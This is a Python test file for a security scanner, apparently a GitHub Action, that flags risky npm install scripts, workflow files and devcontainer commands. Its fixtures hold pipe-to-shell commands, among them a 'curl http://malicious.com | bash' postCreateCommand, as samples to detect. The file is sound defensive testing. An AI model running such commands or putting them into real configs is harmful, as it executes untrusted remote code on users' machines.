"""
Integration tests for file scanning.
Tests pattern detection on changed files with different rules.
"""

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock
import re

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from scan import load_yaml, load_rules


class TestPatternMatching(unittest.TestCase):
    """Tests for pattern matching in paths and content"""

    def test_path_pattern_matching_npm_package(self):
        """Should detect package.json at any directory level"""
        # Load npm-package-scripts rule
        default_rules_path = Path(__file__).parent.parent / "rules" / "default-rules.yml"
        config = load_yaml(default_rules_path)
        
        npm_rule = next((r for r in config["rules"] if r["id"] == "npm-package-scripts"), None)
        self.assertIsNotNone(npm_rule)

        path_patterns = npm_rule["paths"]

        # Should match package.json in root
        self.assertTrue(any(re.search(pattern, "package.json") for pattern in path_patterns))

        # Should match package.json in subdirectory
        self.assertTrue(any(re.search(pattern, "subdir/package.json") for pattern in path_patterns))

        # Should match nested package.json
        self.assertTrue(any(re.search(pattern, "deep/nested/dir/package.json") for pattern in path_patterns))

        # Should NOT match other extensions
        self.assertFalse(any(re.search(pattern, "package.yaml") for pattern in path_patterns))

    def test_path_pattern_matching_workflow_files(self):
        """Should detect workflow files in .github/workflows/"""
        default_rules_path = Path(__file__).parent.parent / "rules" / "default-rules.yml"
        config = load_yaml(default_rules_path)
        
        workflow_rule = next((r for r in config["rules"] if r["id"] == "github-workflows"), None)
        self.assertIsNotNone(workflow_rule)

        path_patterns = workflow_rule["paths"]

        # Should match yml and yaml files
        self.assertTrue(any(re.search(pattern, ".github/workflows/ci.yml") for pattern in path_patterns))
        self.assertTrue(any(re.search(pattern, ".github/workflows/deploy.yaml") for pattern in path_patterns))

        # Should NOT match other directories
        self.assertFalse(any(re.search(pattern, ".gitignore/workflows/ci.yml") for pattern in path_patterns))

    def test_content_pattern_matching_case_insensitive(self):
        """Should perform case-insensitive matching on content"""
        default_rules_path = Path(__file__).parent.parent / "rules" / "default-rules.yml"
        config = load_yaml(default_rules_path)
        
        npm_rule = next((r for r in config["rules"] if r["id"] == "npm-package-scripts"), None)
        content_patterns = npm_rule["patterns"]

        test_content = """
        {
          "scripts": {
            "preinstall": "echo 'test'",
            "PREINSTALL": "echo 'test'",
            "PreInstall": "echo 'test'"
          }
        }
        """

        # Should find preinstall in lowercase
        self.assertTrue(any(re.search(pattern, test_content, re.IGNORECASE | re.MULTILINE) 
                           for pattern in content_patterns 
                           if "preinstall" in pattern.lower()))

    def test_pipe_to_bash_pattern(self):
        """Should detect curl|bash and wget|sh patterns"""
        default_rules_path = Path(__file__).parent.parent / "rules" / "default-rules.yml"
        config = load_yaml(default_rules_path)
        
        npm_rule = next((r for r in config["rules"] if r["id"] == "npm-package-scripts"), None)
        patterns = npm_rule["patterns"]

        test_cases = [
            'curl http://example.com | bash',
            'wget http://example.com | sh',
            'curl -s http://example.com | bash',
            'wget http://example.com | sh -s',
        ]

        for test_case in test_cases:
            found = any(re.search(pattern, test_case, re.IGNORECASE | re.MULTILINE) 
                       for pattern in patterns)
            self.assertTrue(found, f"Should find pattern in: {test_case}")

    def test_devcontainer_patterns(self):
        """Should detect dangerous patterns in devcontainers"""
        default_rules_path = Path(__file__).parent.parent / "rules" / "default-rules.yml"
        config = load_yaml(default_rules_path)
        
        devcontainer_rule = next((r for r in config["rules"] if r["id"] == "devcontainers"), None)
        patterns = devcontainer_rule["patterns"]

        test_content = """
        {
          "postCreateCommand": "curl http://malicious.com | bash",
          "initializeCommand": "echo 'setup'",
          "updateContentCommand": "python script.py"
        }
        """

        # Should find postCreateCommand, initializeCommand, updateContentCommand
        self.assertTrue(any(re.search(pattern, test_content, re.IGNORECASE | re.MULTILINE) 
                           for pattern in patterns))


class TestRuleCombinations(unittest.TestCase):
    """Tests for different rule combinations"""

    def setUp(self):
        """Set up environment for each test"""
        self.fixtures_dir = Path(__file__).parent / "fixtures"

    @patch.dict(os.environ, {
        "GITHUB_ACTION_PATH": str(Path(__file__).parent.parent),
        "RULES_MODE": "merge",
    })
    def test_merge_includes_all_default_rules(self):
        """Merge mode should include all default rules"""
        custom_rules_file = self.fixtures_dir / "custom-rules-merge.yml"
        os.environ["RULES_FILE"] = str(custom_rules_file)

        rules = load_rules()

        expected_default_rules = {
            "npm-package-scripts",
            "npm-native-bindings",
            "github-workflows",
            "devcontainers"
        }

        rule_ids = {rule.get("id") for rule in rules}

        for expected in expected_default_rules:
            self.assertIn(expected, rule_ids)

    @patch.dict(os.environ, {
        "GITHUB_ACTION_PATH": str(Path(__file__).parent.parent),
        "RULES_MODE": "replace",
    })
    def test_replace_excludes_all_default_rules(self):
        """Replace mode should exclude ALL default rules"""
        custom_rules_file = self.fixtures_dir / "custom-rules-replace.yml"
        os.environ["RULES_FILE"] = str(custom_rules_file)

        rules = load_rules()

        rule_ids = {rule.get("id") for rule in rules}

        # Should NOT include any default rules
        self.assertNotIn("npm-package-scripts", rule_ids)
        self.assertNotIn("npm-native-bindings", rule_ids)
        self.assertNotIn("github-workflows", rule_ids)
        self.assertNotIn("devcontainers", rule_ids)

        # Should include only custom rules
        self.assertIn("custom-rule-1", rule_ids)
        self.assertIn("custom-rule-2", rule_ids)

    @patch.dict(os.environ, {
        "GITHUB_ACTION_PATH": str(Path(__file__).parent.parent),
        "RULES_MODE": "merge",
    })
    def test_merge_disabled_rules_removes_from_default(self):
        """Merge mode: disabled_rules should remove only from default rules"""
        custom_rules_file = self.fixtures_dir / "custom-rules-disabled.yml"
        os.environ["RULES_FILE"] = str(custom_rules_file)

        rules = load_rules()
        rule_ids = {rule.get("id") for rule in rules}

        # npm-package-scripts should be disabled
        self.assertNotIn("npm-package-scripts", rule_ids)

        # Other default rules should be present
        self.assertIn("npm-native-bindings", rule_ids)
        self.assertIn("github-workflows", rule_ids)
        self.assertIn("devcontainers", rule_ids)

        # Custom rule should be present
        self.assertIn("company-custom-mcp", rule_ids)


class TestEmptyAndEdgeCases(unittest.TestCase):
    """Tests for empty cases and edge cases"""

    @patch.dict(os.environ, {
        "GITHUB_ACTION_PATH": str(Path(__file__).parent.parent),
        "RULES_MODE": "merge",
        "RULES_FILE": ""
    })
    def test_empty_custom_rules_file(self):
        """Without custom file, should load only default rules"""
        rules = load_rules()

        self.assertGreater(len(rules), 0)
        rule_ids = {rule.get("id") for rule in rules}
        self.assertIn("npm-package-scripts", rule_ids)

    def test_rules_are_list(self):
        """load_rules() should always return a list"""
        with patch.dict(os.environ, {
            "GITHUB_ACTION_PATH": str(Path(__file__).parent.parent),
            "RULES_FILE": ""
        }):
            rules = load_rules()
            self.assertIsInstance(rules, list)


if __name__ == "__main__":
    unittest.main()
